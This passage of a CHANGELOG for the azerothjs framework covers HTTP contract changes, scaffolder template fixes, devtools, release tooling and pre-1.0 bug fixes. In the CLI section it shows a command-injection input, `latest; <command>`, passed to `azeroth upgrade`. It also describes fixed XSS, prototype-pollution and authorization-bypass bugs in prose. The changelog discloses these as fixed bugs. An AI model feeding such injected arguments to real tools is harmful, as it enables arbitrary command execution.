  It is the same primitive-plus-sugar pairing `app.route` has with `app.get`.

### Changed (http)

- **The contract docs lead with the verb helpers.** `get`, `post`, `put`, `patch`, `del` and
  `query` have always shipped, but every example taught `route({ method: 'GET', path: '...' })`
  instead - the general form, three tokens longer, with the method buried in a property. The
  verb form is also strictly SAFER: `get`/`del` take a definition with no `input` field at all,
  so `get('/x', { input })` does not compile, while `route({ method: 'GET', input })` happily
  declares a body on a GET.

  Worth knowing when converting: `del` and `get` being bodyless is what surfaces a DELETE
  that carries a request body. The portable replacement is usually the QUERY STRING rather
  than a path param - `del('/things', { query })` keeps the schema at the boundary, while
  `/things/:id` moves the identifier into a raw `string` with no schema behind it (there is
  no `params` validator by design; a path param is matched, not parsed).

- **The contract's response model is one concept.** A route's response contract is the
  per-status `responses` map, and `output` is the declared shorthand for its 200 entry -
  the docs said as much, but the mount only half-believed it: `reply(200, ...)` validated
  against `responses[200]`, while a PLAIN 200 return only validated when `output` was
  declared, so a route carrying `responses: { 200: shape }` alone sent plain returns to
  the wire unchecked. Both paths now share one per-status lookup, and the OpenAPI exporter
  derives the 200 entry and the contract-violation 500 from that same rule, so the
  document matches what the mount enforces. Alongside it, the boundary's schema
  unification (native `safeParse` when present, `~standard.validate` otherwise) now lives
  in one module shared by the server mount and the client's pre-flight check, and
  `RouteSchema<T>` names what was always structurally true: any Standard Schema validator,
  with the native schema's extras discovered by capability, never required.

### Removed (http)

- **The browser entry no longer exports `guard`.** BREAKING for anyone who imported it from
  `@azerothjs/http/api/shared`, which nothing in either repo did. A guard runs on the server, in
  front of a handler; there is nothing for one to do in a browser, and the entry's own header
  states that the guard and mount half "lives only in the root entry". Exporting it there was
  server surface leaking into the one entry whose whole job is to be safe to bundle. `guard`,
  `Guard`, and `GuardContext` come from `@azerothjs/http/api` as they always did.

- **The contract layer's dead type machinery is gone.** An audit of all 46 exports in the layer,
  each verified by deleting it and re-running the type-level assertions under `tsc`: the
  `StandardSchemaV1` re-export (no consumer, and in neither entry, so no package consumer could
  even see it), `Guard`'s phantom `__add` field (`AddOf` infers through the call signature, so the
  declaration was its own only reference), the unused outer `infer` in `AddOf`, and the outer
  conditional in the client's `Call` type, which tested `extends Record<string, never> | unknown`
  - unconditionally true, making its `never` branch unreachable. Nothing observable changes; there
  is simply less to read. Deliberately KEPT despite having no consumer yet: `uncontracted`, which
  is how an existing app burns down onto contracts one route at a time, and the OpenAPI exporter
  plus explorer, 42% of the layer and the only path by which a non-TypeScript client can consume
  the API at all.

- **A route's response schema is resolved in one place.** The rule that `responses[status]` wins
  and `output` is the shorthand for the 200 entry was implemented twice, independently, in the
  mount and in the OpenAPI exporter - which is how a document starts describing something the
  server does not enforce. Both now call one `responseSchemaFor`. In the same pass the mount's
  "first value wins" flattening of repeated query parameters and repeated multipart fields, two
  copies of one loop with a comment on the second promising it matched the first, became one
  shared helper.

### Added (create-azeroth)

- **The devtools panel is wired into the templates that can host it.** A framework whose pitch
  is a visible reactive graph shipped starters that never showed it. `frontend` and the
  fullstack `application` now mount the inspector in dev, and the fullstack `server` attaches
  the bridge its Server tab reads, so "every request is a reactive root" is something you can
  watch rather than something the README asserts. `backend` deliberately gets none: the panel
  is a page and that template serves none, so it gets a README note on pointing another app's
  Server tab at it instead. Dev-only by construction, not by convention - the client calls sit
  behind `import.meta.env.DEV`, which a build replaces with `false` so the branch and its
  dynamic import are eliminated entirely, and `attachDevtools` throws under
  `NODE_ENV=production` and accepts only localhost origins. The call goes BEFORE
  `render`/`bootClient`, because the runtime only registers primitives constructed after the
  hook is installed; placed after, the panel opens on an empty graph.

- **The dev port is declared, not inherited.** The fullstack README promised "vite on :5173"
  twice while nothing in the project said so - it was vite's implicit default, so a busy 5173
  moved the app to 5174 and the README quietly became wrong (and now the devtools bridge URL is
  written against those ports too). Both client templates declare `server.port` explicitly, and
  because a tailwind overlay REPLACES `vite.config.ts` wholesale rather than merging into it,
  the overlay copies had to restate it - a new test scaffolds every option combination and
  asserts the port and the `/api` proxy survive. Servers stay on 3000: it is the Node
  convention and it is already baked into `.env.example`, `EXPOSE`, `docker run -p`, and the
  `config.port` default. Vite still steps to the next free port rather than failing, so a busy
  machine is still a working first run.

- **Every template ships an `.editorconfig`.** The same one the framework itself uses: UTF-8,
  4-space indent, final newline, trimmed trailing whitespace, and single quotes for
  TypeScript (including the JetBrains key that actually enforces it). A scaffolded app
  therefore formats the way its own source is written from the first keystroke, in any editor,
  with no extension to install. It ships under its real name rather than the `_`-prefixed form
  `.gitignore` needs, because npm reads a nested `.gitignore` as pack-ignore rules and has no
  such handling for this file - the pack test asserts all three arrive.

- **The template READMEs are a proper first page.** Each scaffolded app now opens with a
  centered header and badges, then walks the reader from `npm install` to deploy: a "start
  here" block that says what they will SEE, the scripts and structure as tables, a worked
  example of the thing that template teaches (writing a component, adding a route, the
  fullstack canon tour), and a "next" section that names the one-line change for adding a
  page, an endpoint, or a loader. The `--router` and `--tailwind` overlays append matching
  sections instead of a bare paragraph. Every backticked path in every README is checked to
  exist in the scaffolded tree.
- **CI ships with every shape**, not only `fullstack`. The `frontend` and `backend`
  templates both advertise `npm run check` as their gate and had no workflow to run it.
- **The templates use the `azeroth test` verb**, closing the last gap in the README's promise
  that "every template ships the `azeroth` verbs as its scripts".
- **The shipped tests are typechecked.** All four `tsconfig.json` files scoped `include` to
  `src`, so the `tests/app.spec.ts` every template ships was in no program: a broken test type
  passed `npm run check` and only failed at `npm test`.
- **A test asserts the dependency contract in both directions** - every package a template
  imports is declared in the manifest that owns it, and every declared dependency is used or
  named on an allowlist of bin/loader packages that carry their reason inline (`jiti` loads
  the ESLint TS config, `@azerothjs/language-server` ships `azeroth-tsc`), so a future depcheck
  cannot prune them.

### Changed (create-azeroth)

- **The backend template teaches middleware instead of three toy routes.** `app.use` and
  `app.with` appeared in NO template, so the one thing every real backend needs on its first
  day - a middleware that authenticates a request and attaches something to the context - was
  the one thing a reader never saw. `/hello/:name` and `/echo` are replaced by a single route
  on an `app.with` fork that covers everything they did (a typed path param, `readJson` with
  its body limit and Content-Type check, a `ValidationError` landing in the envelope's
  `error.fields`, a 201 with a shaped body) plus three things they did not: scoped middleware,
  typed context additions read with no cast (`context.userId`), and rejecting a request before
  the handler runs. `/healthz` stays: it is infrastructure every orchestrator probes, not a
  demo. The template's own test grew from three cases to five, and now covers the middleware
  veto and the field map.

- **The fullstack template's wiring files carry code, not lectures.** `server/src/contract.ts`
  was 27 comment lines around 20 lines of declaration - 57% prose, in the file a reader opens
  every time they add a route, explaining what the README already explains better. The
  template's wiring dropped from 485 lines to 403 with nothing removed but narration. What
  survives states a constraint the code cannot: this file is client-safe so importing a service
  here would bundle the server, the key path IS the client's call path, a trailing space
  survives SSE framing while a leading one is eaten, devtools must install before the first
  render. The declaration now reads as an example worth copying rather than a tutorial to skim.

- **The fullstack template teaches both kinds of route, and streams.** It implied everything
  belonged in the contract, which is wrong and is why the contract felt like overhead: the
  typed client REFUSES a multipart route by design, and a streaming response has no JSON body
  to validate, so uploads, webhooks, redirects and token streams were never its job. The
  server half now has `src/stream.ts` beside `src/contract.ts` holding the raw routes, with
  `GET /api/assistant` as a worked server-sent token stream, and the README states the rule:
  the contract is for routes whose whole request and whole response are JSON values worth
  validating, everything else owns its own `Response`. The home page consumes it with the
  `stream` keyword - which no template previously demonstrated - accumulating events into one
  reactive string, and its Stop button cancels the request, which is where a real handler
  stops paying a model provider.

- **Import depth is now a tested constraint.** The tailwind overlay ships its own copy of the
  guest-book page, so fixing the base template's deep import left the overlay's behind - a
  `--tailwind` app still got `../../../server/src/contract.ts`. Both are fixed, and a test now
  scaffolds every template and option combination and rejects any import climbing more than one
  directory, with `application/src/api.ts` whitelisted as the single cross-half seam. Path
  aliases are deliberately NOT the answer here: the zero-build server halves run under plain
  `node`, which does not read tsconfig `paths`, and the compiler's build-time gate for
  `.azeroth` files uses fixed options with no `paths` either - so an aliased import would
  resolve to nothing and silently type as `any` in the one place that is supposed to catch it.

- **The fullstack template's server boots from two files instead of three, and a page no
  longer climbs out of its own half.** `server/src/config.ts` held twenty lines read by exactly
  one importer, so the environment moved to the top of `server/src/main.ts` beside the logger,
  the pipeline, `serve` and shutdown - the same fold the backend template got, for the same
  reason, and `server/src/app.ts` stays a separate pure module so `app.handle(new Request(...))`
  remains a socket-free test. Separately, `application/src/pages/guest-book.azeroth` reached the
  shared schema through `../../../server/src/contract.ts`: three levels up, out of the page
  directory, out of `src`, and across into the other half, which broke the moment a page moved.
  `application/src/api.ts` is now the one seam that crosses halves - it already owned the
  contract-derived client, so it re-exports the shapes pages need and a page imports client and
  schema from one place. The cross-half relative import stays visible in that file, because
  compile-time coupling to the server's declaration is the point.

- **The backend template boots from one file instead of three.** `src/config.ts` held twenty
  lines read by exactly one importer, so the environment now lives at the top of
  `src/main.ts`, where the values are used: `.env` first, then the typed `loadConfig` block,
  then the logger, the edge pipeline, `serve`, and shutdown - the whole outside world in the
  order it happens. `src/app.ts` is untouched and stays a separate module on purpose. That
  boundary is not stylistic: because `buildApp` cannot see the config, it cannot accidentally
  read the environment, which is what keeps `app.handle(new Request(...))` a socket-free test
  with no fixtures. Merging all three into a single file would have needed an
  `import.meta.main` guard to keep the test from booting a real server, and that is Node
  24.2+ while the template's floor is `>=24` - on 24.0 the guard is `undefined` and the
  server silently never starts.

### Fixed (create-azeroth)

- **The fullstack template linted its own build output.** `dist-server/` - the SSR bundle
  from `vite build --ssr` - was missing from the ESLint ignore list, so running
  `azeroth check` after `azeroth build` reported thousands of style errors in generated
  code.
- **Four dependencies were used but never declared**, resolving only through npm's workspace
  hoisting and auto-peer-install. `fullstack/application` imports `@azerothjs/http` directly
  and pulls `@azerothjs/schema` into the BROWSER bundle through the shared contract while
  declaring neither; `backend` and `fullstack/server` never declared `azerothjs`, a required
  peer of both `@azerothjs/http` and `@azerothjs/kit`; and `fullstack/application` ran
  `azeroth` in three of its own scripts without declaring the CLI. Each worked until the half
  was extracted from its workspace or an upstream package dropped a dependency.
- **The fullstack `.dockerignore` was never read.** Docker reads it from the build-context
  ROOT, and the documented build is `docker build -f server/Dockerfile .` from the project
  root - so the file sitting beside the Dockerfile did nothing, and `COPY application
  ./application` shipped `application/node_modules` into the image. It now lives at the root
  with `**/`-prefixed patterns, because a bare `node_modules` matches only the top level and
  this is a workspace.
- **A fullstack scaffold offered to commit its request logs.** The server writes NDJSON to
  `logs/` from its first boot; the root `.gitignore` never mentioned it, and the server half
  shipped no `.gitignore` of its own. The `backend` template had this right all along.
- **`.gitignore` ignored a directory that does not exist.** Three templates listed
  `.azeroth-types/` while the compiler writes its declaration mirror to `.azeroth/types` - so
  the entry was dead AND the real mirror was left untracked-but-unignored. The ESLint configs
  had the correct path all along.
- **`engines` promised a Node that cannot run the code.** The `backend` and `fullstack`
  templates run TypeScript with no build step, and their Dockerfiles (`node:24-slim`), their
  CI, and their own source comments all say Node 24 - while `engines` said `>=22`, which
  cannot strip types unflagged before 22.18. They now say `>=24`; `frontend` stays at `>=22`
  because vite compiles it.
- **One house style, not two.** The four ESLint configs had drifted into pairs: `frontend`
  and `backend` kept the core `indent` rule and allowed TypeScript `private`, while both
  `fullstack` halves dropped `indent` and banned `private`/`protected` in favour of native
  `#private`. Which rules you got depended on which template you picked. They are unified, and
  `indent` is enforced everywhere - the `=> ({ ... })` autofix problem cited when it was
  removed does not reproduce on any template source.
- **`.azeroth`-only ESLint config in templates with no components.** Both server templates
  carried the `.azeroth` ignore and the `**/*.azeroth/*.ts` return-type override, copied from
  the frontend config. The `azeroth.configs.recommended` spread stays: its first entry has no
  `files` filter, so the reactivity rules genuinely reach server `.ts`.
- **The fullstack `preview` script served a broken app.** Carried over from the `frontend`
  template, where it is legitimate, it serves `application/dist` with no API - the exact
  first-click 404 the repo's own scaffold test guards against, and it was never in the
  fullstack README's script table.
- **Prose that described features the starter does not demonstrate.** The README, the SSR
  entry and the app shell all spoke of guards and loaders, but no route declares one, so the
  loader handoff is always `undefined`. The wiring stays (adding a loader is then a one-line
  change) and the comments now say so. An unused `EntryInput` export went with it.

### Fixed (docs)

- **Five reference pages documented packages that do not exist.** `packages/azerothjs/docs/` shipped
  `component.md`, `form.md`, `reactivity.md`, `renderer.md` and `server.md` as if each were its own
  package, complete with an npm badge and an `npm install @azerothjs/renderer` line, from before
  those packages were folded into the unscoped `azerothjs` entry. Published, every one of those
  badges would have rendered as "not found" and every install line would have failed. The pages are
  retargeted rather than deleted: they describe functionality that still ships, so the titles, the
  badges, the install blocks and the imports now all name `azerothjs`.

- **`App` had no documentation on hover.** The class the template's first line imports, its
  constructor, and `get`/`post`/`put`/`patch`/`delete` carried no doc comment at all, so an editor
  showed a signature and nothing else - while `use`, `with` and `register` beside them were
  documented in depth. The class now states what accumulates in `Ctx` and why registration order is
  load-bearing, with a worked example, and `get` records that it answers HEAD as well.

### Fixed (cli)

- **`azeroth upgrade` passed its target through a shell.** npm was spawned as one command
  STRING with `shell: true` (npm is `npm.cmd` on Windows), and the target came straight from
  the command line - so `azeroth upgrade "latest; <command>"` ran `<command>`. It is the one
  place the CLI broke its own rule that children are spawned as an argument array with no
  shell, which is exactly the hazard `azeroth doctor` flags in a project's own scripts. npm
  now takes an argument array with the platform's executable name chosen explicitly, and a
  target that could not be a version or a dist-tag is refused before any child runs.

- **`azeroth doctor`'s mirror-staleness check could never fire.** It looked for
  `.azeroth-types` while the compiler writes `.azeroth/types`, so every run reported "no
  mirror in use" - the check had never once executed against a real project.

### Added (release + contribution infrastructure)

- **GitHub Releases carry the changelog.** `scripts/release-notes.mjs` extracts the
  version's hand-written `CHANGELOG.md` section and the release workflow passes it as the
  release body alongside `--generate-notes`, so a release page reads: install block,
  curated changelog, then GitHub's own "What's Changed" PR list and compare link. A
  re-pushed tag now refreshes the notes instead of skipping them.
- **Commit messages are enforced.** A `commit-msg` hook runs `scripts/check-commit-msg.mjs`,
  a zero-dependency Conventional Commits check (strict about the type and summary, shape-only
  about the scope, transparent to git's own merge/revert/fixup messages).
- **A documentation issue form** (`.github/ISSUE_TEMPLATE/docs.yml`) for doc defects that
  are not code bugs.

### Fixed (release + contribution infrastructure)

- **The version bump no longer corrupts prose.** `bumpFiles()` replaced every `X.Y.Z` in a
  documentation file, which had rewritten a CONTRIBUTING sentence about reaching 1.0.0 into
  a false statement about a later version. Docs are now rewritten only at named anchors
  (`DOC_VERSION_ANCHORS`), CONTRIBUTING.md is no longer bumped at all, and the post-bump
  guard also catches bare `X.Y.Z` tokens instead of prerelease-shaped ones alone.
- **The release gate now matches CI before anything is published.** It runs lint, typecheck,
  build, publish contract, tests, leak, and publish smoke; previously typecheck, tests, and
  the leak check ran only in CI - after the tag push, which is after npm already had the
  version.
- **Issue and PR templates name packages that exist.** The dropdowns listed
  `@azerothjs/reactivity`, `renderer`, `component`, `router`, `store`, `form`, and `server` -
  none of which are packages - and omitted `http`, `kit`, `ws`, `cron`, `logger`, `schema`,
  `cli`, and `create-azeroth`. The feature-request example also proposed lazy route
  splitting, which already ships.
- **CHANGELOG compare links**: the missing `[1.0.0-beta.1]` definition is restored, so
  `[1.0.0-beta.2]` no longer skips a released tag.

## [1.1.0] - 2026-07-27

### Added (create-azeroth)

- **Template options.** The scaffolder grows a curated matrix, asked as yes/no prompts
  interactively and passed as flags in CI: `--router` (frontend) wires pages + nav on the
  framework's own client-side router - a route table, two pages, `<Link>` navigation, zero
  extra dependencies; `--tailwind` (frontend and fullstack) wires Tailwind v4 through
  `@tailwindcss/vite` with the starter's design tokens mapped to real utilities via
  `@theme inline`. The two compose. Options are overlays applied over one base per shape
  with three operations only - file copy, package.json merge, README append - no plugin
  API, no hooks.

### Changed (create-azeroth)

- **The starters look like a product.** Every template's landing view is redesigned around
  the signal strip - the component's real reactive graph as its hero (the `state` cell is
  the button; `derived` cells recompute from the same click) - over a token system with
  one ice-blue accent, paired light/dark backgrounds, and a monospace display voice. The
  fullstack home's health check and guest book gained honest loading / failed / empty
  states, a retry, and a submit-failure path.
- **Templates ship the framework's own lint canon.** Every shape carries an
  `eslint.config.ts` (loaded via `jiti`) with the house rules - allman blocks, 4-space
  indent, single quotes, the azeroth reactivity rules - and the server shapes now lint
  through `azeroth check` like the frontend ones.
- **Real favicons.** The placeholder `favicon.svg` is replaced by the brand PNGs
  (16/32 + apple-touch) in the frontend and fullstack templates.

## [1.0.0] - 2026-07-27

The first stable release. Every package, the `azerothjs` entry package, and both
editor integrations move to 1.0.0 in lockstep.

### Fixed (pre-1.0 release review)

An adversarial review against the built/packed distribution found and this release fixes:

- **A prop-less `<C/>` no longer crashes** a component that reads its props. The prop-less-tag
  optimization emits `C()`; the component now takes `props = {}`, so a defaulted/optional-props
  component used with no attributes renders instead of throwing `Cannot read properties of undefined`.
- **A builtin's `fallback` prop is no longer double-wrapped.** The compiler wrapped
  `fallback={(error, reset) => ...}` in an extra `() => (...)` thunk, so `<ErrorBoundary>` received
  `undefined` for its error/reset and `<Routes fallback>` crashed (blank app on any unmatched URL).
  A function-literal fallback now passes through; a bare-markup fallback is still wrapped.
- **Block-bodied render callbacks stay reactive.** A hole in markup returned from
  `{(row) => { ...; return <span>{ signal }</span>; }}` was emitted as a one-shot value and never
  updated; it is now wrapped in a getter like the expression-bodied form.
- **Component props parameters lower correctly.** A parameter named anything other than `props`
  (`component C(p: P)`) and NESTED destructuring (`{ pos: { x, y } }`) now work; a **rest element**
  (`{ a, ...rest }`) is rejected with a located `azeroth/unsupported-props-rest` error instead of
  silently emitting code that reads an unbound `rest`.
- **A fragment-root component mounts.** `component F { <>...</> }` returned a bare array that crashed
  `render()` and serialized to `[object Object],...`; `render()` and `renderToString()` now handle a
  multi-node root as direct children.
- **HTML character references in text are decoded.** `&amp;`/`&lt;`/`&nbsp;`/`&copy;`/`&mdash;`/`&#38;`
  render as their characters (matching HTML/JSX/Vue/Svelte) instead of as literal entity text.
- **Cross-field `validateForm` errors clear.** A field flagged only by `validateForm` that returns the
  documented partial map (`{}` when valid) now clears once the fields agree, so a fixed
  password-confirm form becomes valid; previously it stayed `isValid() === false` forever.
- **`@azerothjs/schema` `record()` is prototype-pollution safe.** An untrusted `__proto__` key is
  stored as an own property (via `defineProperty`) instead of invoking the prototype setter, so it
  neither poisons the parsed object nor is silently dropped.
- **Devtools no longer leaks signals.** With a hook attached, a disposed component's signals are now
  swept from the registry when their root disposes (signals have no disposal event of their own), so
  a long dev session no longer grows unbounded and the graph snapshot returns to baseline.
- **The reactive graph no longer pins a disposed consumer.** `track()`'s dedup cache
  (`producer.seenConsumer`) is cleared when that consumer unlinks, so a long-lived signal does not
  retain an unmounted reader's closure.
- **Internal package dependencies use `^1.0.0`, not an exact pin**, so a patch to one framework
  package no longer forces a duplicate copy of another in a consumer's tree.
- **Every package exports `./package.json`** (tools that `require.resolve('pkg/package.json')` work),
  and `@azerothjs/kit` declares `"sideEffects": false`.
- **create-azeroth templates run on first `npm run dev`.** The backend and fullstack templates
  imported `fileStream` from `@azerothjs/logger` (it lives on `@azerothjs/logger/node`); the fullstack
  root `npm start` now runs the server from its own workspace so the production command boots.
- **Source maps are line-accurate.** The compiler emitted one coarse mapping for a whole component, so
  a runtime throw's stack, a debugger breakpoint, and the devtools' creation-line attribution all
  resolved to the component's declaration line instead of the real construct. Each emitted construct
  (state/derived/effect/form/factory and the markup) now carries its own source anchor, so a `derived`
  resolves to its own `.azeroth` line.
- **Route-change focus no longer draws a stray focus ring around the page.** After a navigation the
  router moves focus into the new route for keyboard and screen-reader users; when the app has not
  marked a `[data-route-focus]` target it focuses the content root via a transient `tabindex="-1"`,
  which drew the browser's default focus ring around the whole region (a two-tone box that read as a
  stray window border, most visibly after a keyboard-driven navigation). The router now tags that
  fallback region with `data-azeroth-route-focus-fallback` for the duration of the programmatic focus
  and injects one overridable, author-level stylesheet rule that hides the ring for it - never touching
  the element's inline styles. An app-marked `[data-route-focus]` target is left entirely alone and
  stays fully stylable.

### Added

- **`@azerothjs/devtools` rewritten as a primitive-aware inspector.** The panel now speaks
  the authoring language: each declared `form`/`resource`/`store`/`stream`/`selector`/
  `deferred` renders as ONE named, collapsible group with a live status badge (a resource
  shows pending/ready/error, a form valid/invalid/submitting), and bare `state`/`derived`/
  `effect` rows carry their declared names and current values. New chrome: an icon rail
  (Components / Timeline / Graph / Performance / Server / Settings), a search-first toolbar
  (Ctrl+K), an adaptive master-detail inspector (right pane wide, bottom drawer narrow), a
  windowed components list that stays smooth at thousands of nodes, burst-grouped timeline
  rows, and empty states that teach. Persisted layout state is validated and clamped on
  every restore, so a saved geometry can never come back off-screen.
- **Devtools hook protocol v2** (`azerothjs`, additive). Nodes carry `primitive`/`group`/
  `groupName` so higher-level primitives are attributable to their internals, and
  `DevtoolsHook.run(id, cause)` reports the DIRECT producer whose change triggered each run
  (the timeline's `run values <- email` is measured, not inferred). The higher-level
  constructors gained an optional `name` option (`createStore` gained an options parameter);
  `on()` accepts `{ name }` too. Zero-cost-when-detached is unchanged.
- **Keyword names flow to devtools automatically.** On the dev server the compiler passes
  every reactive keyword's declared identifier as its debug name (`state count` ->
  `createSignal(0, { name: "count" })`); an explicit `with { name }` wins, and `store` now
  accepts a `with { ... }` options clause. Every keyword's `with { name }` completes and
  documents in both editors. Production output is byte-identical to before.
- **Server inspection bridge** (`@azerothjs/devtools/server`). `attachDevtools(served.server)`
  exposes a dev-only WebSocket (`/__azeroth/devtools`) streaming the server's reactive graph -
  requests are reactive roots - and the panel's Server tab mirrors it live with the same
  components view and inspector. Refuses to run under `NODE_ENV=production`; browser
  connections are limited to localhost origins by default. `@azerothjs/ws` becomes an
  optional peer of the devtools package.

### Changed

- **`@azerothjs/logger` is now browser-safe at its main entry.** `createLogger` and the sinks
  (`prettySink`/`ndjsonSink`/`consoleSink`/`teeSink`), the banner, serialization, and the color
  utilities load in a bundler without touching a Node builtin, so a frontend can `createLogger()`
  for structured console output. The Node-only pieces moved to a `@azerothjs/logger/node`
  subpath: the file sinks (`fileStream`/`fileSink`, which use `node:fs`/`node:path`) and the
  terminal prompts (`select`/`textInput`/`intro`/`outro`, which use `node:readline`). Update
  server/CLI imports of those to `@azerothjs/logger/node`; everything else is unchanged. This
  fixes a Vite "Module node:path has been externalized for browser compatibility" crash when a
  client imported the logger.

### Fixed

- **`@azerothjs/devtools` panel is now isolated in a shadow root.** The panel mounted as a
  light-DOM child of `<body>`, so the host app's global CSS (a Tailwind preflight `*{}` reset,
  a theme's inherited `color`, `border`, or `box-sizing`) leaked in and could collapse it to a
  broken white strip at the window edge. It now mounts inside an `attachShadow({ mode: 'open' })`
  host with its own base stylesheet, fully isolating it from - and from leaking into - the page.
  The host element is inert (out of flow, zero-size) so it can never shift the app's layout.
- **Hydration of element/list holes.** A reactive hole that returns an element or a list
  (`{cond ? <A/> : <B/>}`, `{items.map(...)}`) hydrated to the literal text
  `[object Object]` - the hole's `h()` output is a hydration descriptor in hydrate mode,
  and the hole driver stringified it instead of adopting the server nodes. It now adopts
  the server content on the first run, as `<Show>`/`<For>` already did.
- **Streaming responses run request cleanups at the stream's end**, not when the handler
  returns. `onRequestCleanup` teardown for a streaming body (SSE, static file, multipart,
  any `new Response(stream)`) previously fired while the stream was still producing,
  releasing a pooled connection/transaction mid-flight. Buffered responses are unchanged.
- **Hydration no longer falls back to a full client render** for elements rendered with
  `innerHTML`/`textContent` (their content is owned by the prop), or for a `<table>` whose
  `<tr>` rows the browser wrapped in an implicit `<tbody>` (now tolerated).
- **Owner/scheduler robustness.** A reactive node created under an already-disposed owner
  (the `runWithOwner(getOwner(), ...)`-after-await pattern) is now torn down immediately
  instead of leaking; disposers registered *during* teardown run instead of being dropped;
  and a throwing effect no longer strands the rest of a flush - the others still run and the
  error surfaces after.
- **`{ secret: true }` config values** are redacted on the `console.log`/`util.inspect` path,
  not only `JSON.stringify` (added the `nodejs.util.inspect.custom` hook).
- **Compiler diagnostics for a missing `;` before markup.** `state count = 0` with no
  semicolon followed by markup silently dropped the markup and emitted broken JS; it is now
  an `azeroth/unterminated-declaration` error. Markup placed directly as a declaration value
  is flagged too.
- **`<script>`/`<style>` are parsed as raw-text (CDATA).** Their content (CSS, a JSON-LD
  `<script type="application/ld+json">`) is read verbatim and serialized unescaped, instead
  of being parsed for `{ ... }` holes and HTML-escaped (which corrupted `&`/`<`).
- **`evalConstant`** no longer folds a multi-statement slice to its first expression,
  which silently dropped the remainder.
- Clearer errors for `<For each={...}>` with a nullish value (renders nothing) or a non-array,
  and for `renderToString(App())` called without the `() =>` thunk.

### Changed

- **`azerothjs` is now a ranged peer dependency** (`^1.0.0`) of `@azerothjs/http`,
  `@azerothjs/kit`, `@azerothjs/testing`, and `@azerothjs/devtools`, instead of an exact
  regular dependency. The runtime holds module-level state (the per-request store scope), so
  an exact pin let a version skew install a second copy and silently break request isolation;
  a ranged peer dedupes to one copy.
- **`typescript` is a required peer of `@azerothjs/compiler`** (no longer marked optional):
  the package eagerly loads TypeScript-backed analysis, so it was never truly optional.

### Changed (production readiness)

- **engines**: the Node floor is now `>=22` (down from `>=24`) - Node 22 is Active LTS
  through 2027 and every published package runs on it. The zero-build backend's
  `node src/main.ts` needs unflagged native TypeScript (Node 22.18+, 23.6+, or 24),
  which `azeroth doctor` now checks precisely.
- **@azerothjs/compiler**: `lintMarkup(node, source, options?)` - the `source` argument is
  now required (was optional, which silently disabled the interpolation-spacing rule -
  a legacy call shape).
- **@azerothjs/eslint-plugin / language-server**: `azerothjs` is now an (optional) peer
  dependency of the compiler and language-server, so a compiler that emits imports for a
  runtime version the app doesn't have is caught by npm instead of a raw ESM error. The
  compiler's `vite` peer is `>=8` (it uses vite 8's `transformWithOxc`).

### Fixed (editor markup model)

- **@azerothjs/compiler**: a root markup element written directly after a reactive block -
  `effect { ... } <div>...`, `dispose { ... } <ul>...` - is now recognized as markup by the
  scanner (a block-closing `}` begins expression position), so the editor gives it semantic
  tokens, hover, and completion. It already compiled; only the editor's markup model missed it.

### Changed (drift-proofing)

- The language server's reactive-keyword set (semantic tokens), name-keyword set (hover), and
  void-element set (auto-close) now import the compiler's canonical tables instead of keeping
  hand-maintained copies, so a keyword or built-in added to the compiler can never be silently
  missed by the editor. The compiler's void-element list is now a single set (the scanner's),
  re-exported to the parser and tooling.

### Added (editor completeness)

- Hover documentation for the `bind:` / `class:` / `style:` directives.
- Completion snippet bodies for the `Dynamic` and `Outlet` built-ins (previously offered
  by name only). A new completeness spec welds the language server's built-in docs and
  snippets to the compiler's canonical `BUILTIN_COMPONENTS` list, so a built-in can no
  longer ship without both.

### Fixed (pre-1.0 audit round 2)

- **azerothjs**: the `stream` keyword produced code that crashed at first fetch. The
  compiler lowers `stream x = (v) => fetch(v) with { source }` to a positional
  `createStream(source, fetcher, options)` call (parallel to `createResource`), but
  the runtime only accepted a single options object - and the proving type error was
  silently dropped by the language server's diagnostics policy. `createStream` now has
  the same positional overloads as `createResource`; the emitted call type-checks and
  runs. Locked with positional-form tests.
- **@azerothjs/http**: `@seriousme/openapi-schema-validator` (used by an http test) is
  now a declared devDependency; it previously resolved only through a stale lockfile
  entry from the pre-fold layout, so a clean install would have broken the test. The
  9 leftover ghost workspace entries from folded packages were purged from the lockfile.
- **language-server**: the `effect (deps)` hover no longer shows a `watch (...)` example
  that the parser rejects (the `watch` keyword form no longer exists).

### Removed (dead / legacy code)

- **@azerothjs/http**: a dead `HttpError` re-export from `app.ts` (the package entry
  `index.ts` already exports it) - a leftover alias violating the no-legacy rule.
- Dead `export` modifiers on module-private helpers across azerothjs, cli,
  compiler, and language-server (symbols retained, public surface trimmed).
- **@azerothjs/compiler**: the duplicate `BUILTIN_COMPONENTS` list in `project.ts` now
  imports the canonical one from `builtins.ts` (was a hand-maintained twin that could
  drift from the runtime's actual built-ins).
- **@azerothjs/eslint-plugin**: dropped a redundant `azerothjs` peer (it flows through
  the compiler/language-server deps) and declared its real `typescript` peer.

### Fixed (pre-1.0 blocker sweep)

A from-scratch adversarial review found ten confirmed release-blockers, each
reproduced against the shipped build and each now fixed with a pinned regression test:

- **compiler (parser)**: a regex literal or an apostrophe inside a markup hole no
  longer breaks compilation. The brace scanner (`skipBalanced`) was blind to regex
  literals and to embedded markup, so `<p>{ name.replace(/'/g, '') }</p>` or an
  apostrophe in nested markup text (`{ ok ? <span>Don't</span> : ... }`) desynced
  the scan and hard-failed the build with a bogus "Unclosed tag". The scanner now
  consumes regex literals (disambiguated from division by the preceding token) and
  markup regions as whole units.
- **azerothjs (reactivity)**: `createEffect`/`createMemo` now re-establish their
  CREATION owner and error handler around EVERY run, not just the first. Previously
  a re-run inherited whatever scope triggered it, so `useContext` bled across
  components, `getOwner()` returned null on re-runs, and `<ErrorBoundary>` missed
  throws from dynamically-mounted children.
- **azerothjs (SSR)**: attribute NAMES are validated during serialization - a prop
  key containing a quote, space, or `>` (an injection attempt to break out of the
  attribute context) is now rejected, mirroring the DOM path's `setAttribute`.
  Previously such a name was emitted raw, injecting a live handler (XSS).
- **azerothjs / @azerothjs/kit (router + SSR)**: a guard that returns `false` no
  longer leaks its protected page. `matchAndLoad` now returns a distinct blocked
  result (and separate not-found/redirect arms) instead of collapsing a veto into
  `null`; `createPageRenderer` maps it to a 403 that renders NOTHING, and a
  no-match renders the app's fallback at a real 404 - `PageResult` gained a `status`.
  Previously a vetoed SSR route was served as a rendered 200 (authorization bypass).
- **azerothjs (router)**: a synchronous `redirect()` from a guard on the initial URL
  no longer crashes `createRouter` with a temporal-dead-zone `ReferenceError` (the
  auth deep-link pattern) - the navigation machinery the boot-time guard reaches is
  now declared ahead of the guard effect.
- **@azerothjs/http (kernel)**: `json`/`text`/`html` responses no longer drop all
  but one `Set-Cookie`. Cookies are carried apart from the header record (which
